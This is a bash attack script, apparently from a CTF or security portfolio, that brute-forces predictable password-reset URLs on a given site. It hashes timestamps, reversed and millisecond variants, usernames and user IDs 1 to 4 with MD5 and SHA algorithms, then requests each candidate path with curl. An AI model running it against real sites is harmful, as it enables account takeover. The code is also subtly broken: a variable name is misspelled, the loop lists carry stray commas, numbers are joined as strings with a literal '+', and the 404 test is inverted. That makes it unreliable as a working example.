#!/bin/bash

multiline_string=$(cat <<'EOF'
 _   _ ___ ____  _____   __  __ _____ ___ 
| | | |_ _|  _ \| ____| |  \/  | ____|__ \
| |_| || || |_) |  _|   | |\/| |  _|   / /
|  _  || ||  _ <| |___  | |  | | |___ |_| 
|_| |_|___|_| \_\_____| |_|  |_|_____|(_) 

By neptr AKA N0tHarbor
EOF
)

echo "$multiline_string" 


# Display usage information
usage() {
    echo "Usage: $0 -time <time> -url <url> -user <user>"
    exit 1
}

# Variable Dec:
epoch=""
user=""
url=""


# Parse CMD arg
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -time)
            if [[ -n "$2" && "$2" != -* ]]; then
                time="$2"
		epoch=$(date -d "$2" +%s)
                shift 2
            else
                echo "Error: -time requires a value."
                usage
            fi
            ;;
        -url)
            if [[ -n "$2" && "$2" != -* ]]; then
                url="$2"
                shift 2
            else
                echo "Error: -url requires a value."
                usage
            fi
            ;;
        -user)
            if [[ -n "$2" && "$2" != -* ]]; then
                user="$2"
                shift 2
            else
                echo "Error: -user requires a value."
                usage
            fi
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# Arg Check
if [[ -z "$time" || -z "$url" || -z "$user" ]]; then
    usage
fi


# Variable Dec:
rev_epoch=$(echo "$epoch" | rev)
mili_epoch="$epoch"+"000"
mili_rev="000"+"$rev_epoch"


contains_404() {
	local input_string="$1"
#	echo "$1" | grep 404

	# Check if the input string contains the word "404"
	if [[ $input_string =~ (^|[[:space:]])404($|[[:space:]]) ]]; then
		return 0
	else
		return 1
	fi
}

check_url() {
	local full_url="$1"
	response=$(curl -s "$full_url" 2> /dev/null)
	if contains_404 "$response"; then
		echo "URL: $full_url did not return 404."
	fi
}


echo "[$] Searching for password reset URL @$url"

# Try Server Date Header Response
for x in $epotch, $rev_epoch, $mili_epoch, $mili_rev;
do
	# Attempt to find various hash formats:
	check_url "$url/$(echo -n "$x" | md5sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x" | sha1sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x" | sha256sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x" | sha384sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x" | sha512sum | cut -d ' ' -f 1)"

	# Attempt the same with user in front
	check_url "$url/$(echo -n "$user$x" | md5sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$user$x" | sha1sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$user$x" | sha256sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$user$x" | sha384sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$user$x" | sha512sum | cut -d ' ' -f 1)"

	# Attempt with user on the end
	check_url "$url/$(echo -n "$x$user" | md5sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x$user" | sha1sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x$user" | sha256sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x$user" | sha384sum | cut -d ' ' -f 1)"
	check_url "$url/$(echo -n "$x$user" | sha512sum | cut -d ' ' -f 1)"

	# Attempt with just user
        check_url "$url/$(echo -n "$user" | md5sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user" | sha1sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user" | sha256sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user" | sha384sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user" | sha512sum | cut -d ' ' -f 1)"

done

echo "[!] Expanding time frame [10 second span]"

# Span Time by 10 seconds:
start=$(($(echo $epotch) - 10))
stop=$epotch

for (( y=start; y<=stop; y++ ));
do
	temp_epoch=$y
	temp_rev_epoch=$(echo "$temp_epotch" | rev)

	for x in $temp_epotch, $temp_rev_epoch;
	do
        	# Attempt to find various hash formats:
        	check_url "$url/$(echo -n "$x" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha512sum | cut -d ' ' -f 1)"

        	# Attempt the same with user in front
        	check_url "$url/$(echo -n "$user$x" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha512sum | cut -d ' ' -f 1)"

        	# Attempt with user on the end
        	check_url "$url/$(echo -n "$x$user" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha512sum | cut -d ' ' -f 1)"

	done
done

echo "[%] Dropping into Miliseconds [5 second span]"
stop=$(echo $epotch)000
start=$(($(echo $epotch)000-5000))

for (( y=start; y<=stop; y++ ));
do
        temp_epoch=$y
        temp_rev_epoch=$(echo "$temp_epoch" | rev)

        for x in $temp_epotch, $temp_rev_epoch;
        do

                # Attempt to find various hash formats:
        	check_url "$url/$(echo -n "$x" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x" | sha512sum | cut -d ' ' -f 1)"

        	# Attempt the same with user in front
        	check_url "$url/$(echo -n "$user$x" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$user$x" | sha512sum | cut -d ' ' -f 1)"

        	# Attempt with user on the end
        	check_url "$url/$(echo -n "$x$user" | md5sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha1sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha256sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha384sum | cut -d ' ' -f 1)"
        	check_url "$url/$(echo -n "$x$user" | sha512sum | cut -d ' ' -f 1)"

        done
done

echo "[=] Attempting UID Value, user combos"


for x in {1..4} # Application only has 4 user ID's
do
	# Attempt to find various hash formats:
        check_url "$url/$(echo -n "$x" | md5sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x" | sha1sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x" | sha256sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x" | sha384sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x" | sha512sum | cut -d ' ' -f 1)"

        # Attempt the same with user in front
        check_url "$url/$(echo -n "$user$x" | md5sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user$x" | sha1sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user$x" | sha256sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user$x" | sha384sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$user$x" | sha512sum | cut -d ' ' -f 1)"

        # Attempt with user on the end
        check_url "$url/$(echo -n "$x$user" | md5sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x$user" | sha1sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x$user" | sha256sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x$user" | sha384sum | cut -d ' ' -f 1)"
        check_url "$url/$(echo -n "$x$user" | sha512sum | cut -d ' ' -f 1)"

done

echo ":( No reset url found"
